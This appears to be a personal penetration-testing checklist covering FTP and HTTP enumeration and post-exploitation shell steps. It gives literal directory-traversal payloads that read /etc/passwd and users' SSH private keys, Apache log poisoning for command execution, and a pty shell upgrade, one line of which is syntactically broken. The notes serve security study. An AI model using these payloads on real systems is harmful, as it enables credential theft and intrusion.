#Services
# ftp 21:
- [ ] check anonymous access - user and passwd = anonymous
- [ ] if we don't get results with ls or ls -a try command quote PAS and try ls
# http 80:
- [ ] manual inspection (firefox) and source analysis code
- [ ] wfuzz dirbust/parameter
- [ ] nikto
## [[directory traversal]]
## etc/passwd 
- [ ] `/cgi-bin/../../../../../../../../../../../../etc/passwd`
- [ ] `/index.php?page=../../../../../../../../../../../../../etc/passwd`
## ssh id_rsa
- [ ] `/cgi-bin/../../../../../../../../../../../../home/username/.ssh/id_rsa`
- [ ] `/index.php?page=/../../../../../../../../../../../../home/username/.ssh/id_rsa`
- [ ] `chmod 600 id_rsa`
## log poisoning
#log-posoning
- [ ] `index.php?page=../../../../../../../../../var/log/apache2/access.log`
- [ ] `index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps`
- [ ] url encode command 

# post exploitation 

## [[fully interactive shell]]
- [ ] `which python`
- [ ] check if we have tty `tty`
- [ ]  `python -c 'import pty;pty.spawn("/bin/bash)`
- [ ] exports the paths `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp`
- [ ] `export TERM=xterm-256color`
- [ ] `alias ll='clear ; ls -lsaht --color=auto'`
- [ ] <ctrl+z> + `stty raw -echo ; fg ; reset `
- [ ]  `stty columns 200 rows 200`

## check directories 
- [ ] check root file system 
- [ ] check users 
- [ ] check if we have mysql 
- [ ] check if we have permission to write `var/tmp`
- [ ] check `/dev/shm`

## check net 
- [ ] check network `netstat -tunlp` 
	look for `127.0.0.1:<ports>` that don't come out from external research

## check processes
- [ ] `ps aux | grep -i 'root' color=auto`
	check after the square brackets 


